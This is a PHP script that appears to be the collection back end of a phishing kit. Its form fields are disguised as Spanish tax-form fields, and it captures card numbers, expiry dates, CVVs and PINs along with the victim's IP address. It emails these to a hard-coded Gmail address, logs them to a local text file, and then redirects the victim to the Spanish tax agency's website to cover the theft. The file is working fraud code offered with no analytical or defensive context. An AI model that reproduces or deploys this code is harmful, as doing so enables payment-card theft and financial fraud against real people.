<?

$dat3=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$message .= "CC : ".$_POST['NIF']."\n";
$message .= "EXP : ".$_POST['APELLIDO']."\n";
$message .= "CVV : ".$_POST['APELLIDO1']."\n";
$message .= "PIN : ".$_POST['APELLIDO2']."\n";
$message .= "IP: ".$ip."\n";
$message .= "Date: ".$dat3."\n";


$recipient = "aqzwfx123@gmail.com";
$subject = "toma renta";
$headers = "From";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("$cc", "Bank Of America ReZulT (Thief)", $message);
$ff=fopen("xxx.txt","a");
fwrite($ff,$message);
fclose($ff);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: https://www.agenciatributaria.gob.es/");

}	
?>













